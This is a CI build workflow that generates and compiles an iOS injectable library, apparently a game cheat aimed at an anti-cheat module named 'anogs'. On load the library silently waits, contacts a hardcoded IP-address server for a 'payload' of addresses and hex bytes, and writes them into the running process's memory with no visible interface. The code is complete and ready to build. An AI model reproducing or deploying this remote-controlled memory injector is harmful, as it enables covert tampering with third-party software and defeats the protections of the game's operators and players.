name: Sovereign-Pro-Build

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Generate and Compile Sovereign Core (Phantom Mode)
        run: |
          # Generating Pure English Source Code - No UI, No Crashes
          cat << 'EOF' > main.mm
          #import <UIKit/UIKit.h>
          #import <mach-o/dyld.h>
          #import <mach/mach.h>
          #import <Foundation/Foundation.h>
          #import <objc/runtime.h>

          // [1] COMMAND CENTER COORDINATES
          #define SERVER_API @"http://16.171.230.58/dashboard_v60.php?api=true"

          // =========================================================
          // [2] SAFE MEMORY PATCH ENGINE (Phantom Injector)
          // =========================================================
          void execute_phantom_patch(NSArray *payloads) {
              uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
              uintptr_t anogsBase = 0;
              
              uint32_t count = _dyld_image_count();
              for (uint32_t i = 0; i < count; i++) {
                  const char *name = _dyld_get_image_name(i);
                  if (name && strstr(name, "anogs")) { 
                      anogsBase = _dyld_get_image_vmaddr_slide(i); 
                      break; 
                  }
              }

              mach_port_t task = mach_task_self();
              
              for (NSDictionary *patch in payloads) {
                  NSString *targetFile = patch[@"target_path"] ? patch[@"target_path"] : patch[@"name"];
                  uintptr_t base = 0;
                  
                  if ([targetFile containsString:@"anogs"] || [targetFile containsString:@"anogs.framework"]) {
                      base = anogsBase;
                  } else {
                      base = shadowBase;
                  }

                  if (base == 0) continue;

                  uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
                  uintptr_t targetAddr = base + addr;
                  NSString *hexStr = patch[@"hex_val"] ? patch[@"hex_val"] : patch[@"hex"];
                  
                  if (!hexStr) continue;

                  NSString *cleanHex = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
                  if ([cleanHex hasPrefix:@"0x"]) cleanHex = [cleanHex substringFromIndex:2];
                  
                  NSMutableData *data = [NSMutableData data];
                  for (int i = 0; i + 2 <= cleanHex.length; i += 2) {
                      unsigned int v; 
                      [[NSScanner scannerWithString:[cleanHex substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
                      unsigned char c = (unsigned char)v; 
                      [data appendBytes:&c length:1];
                  }

                  // Safe Write Protocol
                  kern_return_t kr = vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                  if (kr == KERN_SUCCESS) {
                      vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
                      vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
                  }
              }
          }

          // =========================================================
          // [3] PHANTOM UPLINK (Silent Server Connection)
          // =========================================================
          void initiate_phantom_uplink() {
              NSURL *url = [NSURL URLWithString:SERVER_API];
              NSURLRequest *req = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10.0];
              
              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                  if (err || !data) return;
                  
                  NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                  if (!json) return;

                  // Execute patches silently if safe
                  if ([json[@"system_status"] isEqualToString:@"safe"]) {
                      NSArray *payload = json[@"payload"];
                      if (payload && payload.count > 0) {
                          execute_phantom_patch(payload);
                      }
                  }
                  
              }] resume];
          }

          // =========================================================
          // [4] IGNITION SEQUENCE (No UI, No Crash)
          // =========================================================
          void __attribute__((constructor)) start_phantom_core() {
              // Wait 15 seconds for game to fully load and stabilize
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(15 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  // Connect to server and patch memory WITHOUT showing any UI
                  initiate_phantom_uplink();
              });
          }
          EOF

          export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
          clang -dynamiclib -arch arm64 main.mm -o Sovereign_Phantom.dylib \
          -isysroot $SDK_PATH \
          -framework Foundation -framework UIKit -framework CoreGraphics \
          -fobjc-arc -Os -w -lc++

      - name: Upload Sovereign Dylib
        uses: actions/upload-artifact@v4
        with:
          name: Sovereign-Phantom-Silent
          path: Sovereign_Phantom.dylib
